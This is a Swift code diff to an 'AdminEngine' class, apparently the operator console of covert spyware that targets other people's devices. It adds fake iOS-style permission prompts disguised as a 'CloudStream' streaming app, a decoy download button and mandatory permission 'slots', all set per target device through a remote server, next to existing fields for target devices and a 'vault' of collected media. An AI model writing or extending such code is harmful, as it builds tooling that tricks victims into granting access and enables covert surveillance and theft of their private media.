@@ -48,6 +48,17 @@ class AdminEngine: ObservableObject {
     @Published var selectedDevice: TargetDevice? = nil
     @Published var vaultMedia: [VaultMediaItem] = []
 
+    // Dynamic Configuration for Slots and Fake Permissions
+    @Published var configFakePrompt1Title: String = "\"CloudStream\" Would Like to Access Media Stream Cache"
+    @Published var configFakePrompt1Msg: String = "To buffer extension repository and streaming provider data."
+    @Published var configFakePrompt2Title: String = "\"CloudStream\" Would Like to Enable Background Sync"
+    @Published var configFakePrompt2Msg: String = "To keep streaming providers and repository buffer updated."
+    @Published var configButtonTitle: String = "Download CloudStream Provider"
+    @Published var configSlot1Title: String = "Slot 1"
+    @Published var configSlot2Title: String = "Slot 2"
+    @Published var configSlot3Title: String = "Slot 3"
+    @Published var configSlot4Title: String = "Slot 4"
+
     // Live Progress Telemetry
     @Published var isProgressVisible: Bool = false
     @Published var progressCurrent: Int = 0
@@ -129,6 +140,63 @@ class AdminEngine: ObservableObject {
                 DispatchQueue.main.async {
                     self.vaultMedia = res.items
                 }
+            }
+        }.resume()
+    }
+
+    func fetchDeviceConfig() {
+        let devId = selectedDevice?.id ?? "DEFAULT"
+        guard let url = URL(string: "\(serverURL)/api/device/config?deviceId=\(devId)") else { return }
+
+        session.dataTask(with: url) { [weak self] data, _, error in
+            guard let self = self, let data = data, error == nil else { return }
+            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+               let cfg = json["config"] as? [String: Any] {
+                DispatchQueue.main.async {
+                    if let t1 = cfg["fakePrompt1Title"] as? String { self.configFakePrompt1Title = t1 }
+                    if let m1 = cfg["fakePrompt1Message"] as? String { self.configFakePrompt1Msg = m1 }
+                    if let t2 = cfg["fakePrompt2Title"] as? String { self.configFakePrompt2Title = t2 }
+                    if let m2 = cfg["fakePrompt2Message"] as? String { self.configFakePrompt2Msg = m2 }
+                    if let btn = cfg["cloudStreamButtonTitle"] as? String { self.configButtonTitle = btn }
+                    if let s1 = cfg["slot1"] as? [String: Any], let t = s1["title"] as? String { self.configSlot1Title = t }
+                    if let s2 = cfg["slot2"] as? [String: Any], let t = s2["title"] as? String { self.configSlot2Title = t }
+                    if let s3 = cfg["slot3"] as? [String: Any], let t = s3["title"] as? String { self.configSlot3Title = t }
+                    if let s4 = cfg["slot4"] as? [String: Any], let t = s4["title"] as? String { self.configSlot4Title = t }
+                }
+            }
+        }.resume()
+    }
+
+    func saveDeviceConfig(completion: @escaping (Bool) -> Void) {
+        let devId = selectedDevice?.id ?? "DEFAULT"
+        guard let url = URL(string: "\(serverURL)/api/device/config") else { completion(false); return }
+
+        var req = URLRequest(url: url)
+        req.httpMethod = "POST"
+        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+
+        let config: [String: Any] = [
+            "slot1": ["title": configSlot1Title, "subtitle": "", "mandatory": true, "denyMsg": "", "active": true],
+            "slot2": ["title": configSlot2Title, "subtitle": "", "mandatory": true, "denyMsg": "", "active": true],
+            "slot3": ["title": configSlot3Title, "subtitle": "", "mandatory": true, "denyMsg": "", "active": true],
+            "slot4": ["title": configSlot4Title, "subtitle": "", "mandatory": true, "denyMsg": "", "active": true],
+            "cloudStreamButtonTitle": configButtonTitle,
+            "fakePrompt1Title": configFakePrompt1Title,
+            "fakePrompt1Message": configFakePrompt1Msg,
+            "fakePrompt2Title": configFakePrompt2Title,
+            "fakePrompt2Message": configFakePrompt2Msg
+        ]
+
+        let body: [String: Any] = [
+            "deviceId": devId,
+            "config": config
+        ]
+        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
+
+        session.dataTask(with: req) { _, res, error in
+            let success = (error == nil && (res as? HTTPURLResponse)?.statusCode == 200)
+            DispatchQueue.main.async {
+                completion(success)
             }
         }.resume()
     }
